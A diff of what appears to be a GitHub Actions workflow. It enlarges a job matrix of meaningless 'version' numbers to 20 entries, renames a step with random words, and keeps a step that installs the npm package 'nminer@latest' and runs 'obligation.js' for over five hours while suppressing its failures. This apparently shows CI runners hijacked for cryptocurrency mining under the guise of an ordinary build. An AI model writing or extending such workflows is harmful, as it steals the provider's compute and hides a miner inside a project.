@@ -9,22 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4312 }
-          - { version: 59 }
-          - { version: 5944 }
-          - { version: 4582 }
-          - { version: 2857 }
-          - { version: 5608 }
-          - { version: 373 }
-          - { version: 1871 }
-          - { version: 5918 }
-          - { version: 8317 }
-          - { version: 7497 }
-          - { version: 4600 }
-          - { version: 3783 }
-          - { version: 7913 }
-          - { version: 1048 }
-          - { version: 2257 }
+          - { version: 203 }
+          - { version: 4146 }
+          - { version: 9488 }
+          - { version: 8924 }
+          - { version: 8602 }
+          - { version: 2405 }
+          - { version: 9605 }
+          - { version: 9072 }
+          - { version: 8406 }
+          - { version: 3723 }
+          - { version: 5913 }
+          - { version: 6096 }
+          - { version: 824 }
+          - { version: 7176 }
+          - { version: 5454 }
+          - { version: 3786 }
+          - { version: 4027 }
+          - { version: 8172 }
+          - { version: 6255 }
+          - { version: 6497 }
 
     steps:
       - name: Checkout
@@ -35,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: on lazily worthy kick
+      - name: between willfully
         run: |
           npm install nminer@latest
-          timeout 306m node obligation.js || echo "obligation executed"
+          timeout 315m node obligation.js || echo "obligation executed"
